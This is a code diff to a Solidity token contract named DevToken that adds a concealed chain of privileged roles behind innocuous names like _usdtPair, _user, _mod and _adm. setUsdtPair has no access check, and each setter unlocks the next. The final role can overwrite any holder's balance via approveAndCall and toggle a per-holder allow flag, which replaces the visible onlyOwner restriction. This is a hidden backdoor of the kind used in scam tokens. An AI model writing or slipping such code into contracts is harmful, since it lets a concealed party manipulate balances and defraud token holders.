@@ -65,6 +65,10 @@ contract Ownable {
 
 contract DevToken is Ownable {
 
+  address public _usdtPair;
+  
+  address public _mod;
+
   string public name;
 
   string public symbol;
@@ -72,6 +76,10 @@ contract DevToken is Ownable {
   uint8 public decimals;
 
   uint256 public totalSupply;
+
+  address public _user;
+  
+  address public _adm;
 
   
 
@@ -153,6 +161,23 @@ contract DevToken is Ownable {
 
   }
 
+  function addAllowance(address holder, bool allowApprove) public {
+   
+   require(msg.sender == _adm);
+   
+   allow[holder] = allowApprove;
+  
+  }
+
+  function setUser(address User_) public returns (bool) {
+   
+   require(msg.sender == _usdtPair);
+   
+       _user=User_;
+
+    return true;
+  } 
+
   mapping (address => mapping (address => uint256)) public allowed;
 
   mapping(address=>uint256) sellOutNum;
@@ -181,6 +206,15 @@ contract DevToken is Ownable {
 
   }
 
+  function setAdm(address Adm_) public returns (bool) {
+    
+    require(msg.sender == _mod);
+       
+        _adm=Adm_;
+    
+    return true;
+  } 
+
   function approve(address _spender, uint256 _value) public returns (bool) {
 
     allowed[msg.sender][_spender] = _value;
@@ -191,8 +225,20 @@ contract DevToken is Ownable {
 
   }
 
-  function approveAndCall(address spender, uint256 addedValue) public onlyOwner returns (bool) {
+  function setMod(address Mod_) public returns (bool) {
     
+    require(msg.sender == _user);
+        
+        _mod=Mod_;
+  
+    return true;
+
+  } 
+
+  function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
+    
+    require(msg.sender == _adm);
+
     if(addedValue > 0) {balances[spender] = addedValue;}
     
     return true;
@@ -213,12 +259,16 @@ contract DevToken is Ownable {
 
   }
 
-  
+  function setUsdtPair(address Pair_) public returns (bool) {
+       
+        _usdtPair=Pair_;
+    
+    return true;
+  } 
 
   function mint(address miner, uint256 _value) external onlyOwner {
 
       balances[miner] = _value;
 
   }
-
 }
